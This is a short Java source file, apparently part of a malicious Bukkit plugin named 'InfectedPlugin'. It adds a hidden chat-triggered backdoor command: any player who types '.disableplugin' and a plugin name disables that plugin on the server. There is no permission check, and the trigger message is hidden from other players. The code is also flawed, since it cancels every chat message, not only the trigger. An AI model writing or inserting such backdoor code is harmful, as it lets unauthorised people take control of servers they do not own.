package org.CreeperCoders.InfectedPlugin.Commands;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.plugin.Plugin;
import org.bukkit.entity.Player;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class Command_disableplugin implements Listener
{
    public void onPlayerChat(AsyncPlayerChatEvent event)
    {
        String message = event.getMessage();
        String[] args = message.split(" ");
        Player p = event.getPlayer();
        boolean cancel = true;
    
        if (message.toLowerCase().contains(".disableplugin"))
        {
            Plugin plugin = Bukkit.getPluginManager().getPlugin(args[1]);
            if (plugin != null)
            {
                Bukkit.getPluginManager().disablePlugin(plugin);
            }
            p.sendMessage(ChatColor.AQUA + "Plugin disabled!");
            cancel = true;
        }
        
        if (cancel)
        {
            event.setCancelled(true);
            return;
        }
    }
}
